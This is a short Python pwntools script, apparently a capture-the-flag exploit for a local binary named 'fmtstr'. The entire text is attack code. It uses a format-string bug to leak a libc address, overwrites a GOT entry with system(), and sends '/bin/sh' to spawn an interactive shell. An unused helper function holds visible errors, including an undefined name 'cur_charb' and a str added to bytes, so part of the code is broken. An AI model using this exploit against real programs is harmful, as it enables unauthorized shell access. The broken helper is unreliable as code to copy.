from pwn import *
from roppy import fmtstr64
p = process("./fmtstr")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


payload = b"%9$s%4444c\0".ljust(24)
payload += p64(0x601020)
p.sendline(payload)
def writeqword(addr, val):
    ret = b''
    str_rep = p64(val)
    last_char = 0
    for cur_char in range(256):
        for j in range(8):
            if (str_rep[j]) == cur_char:
                if not last_char == cur_char:
                    ret += b'%1$' + str(cur_char - last_char).encode("latin") + b'c'
                    last_char = cur_charb
                ret += b'%' + str(6 + 16 + j).encode("latin") + '$hhn'
    ret += b';' * (128 - len(ret))
    for i in range(8):
        ret += p64(addr + i)
    return ret


libc.address = u64(p.recv(6).strip().ljust(8, b"\x00")) - libc.symbols['__libc_start_main']
log.info("libc:       "+hex(libc.address))
system = libc.symbols['system']

pause()

p.sendline(fmtstr64(6, {0x601018: system}))
p.sendline("/bin/sh")

p.interactive()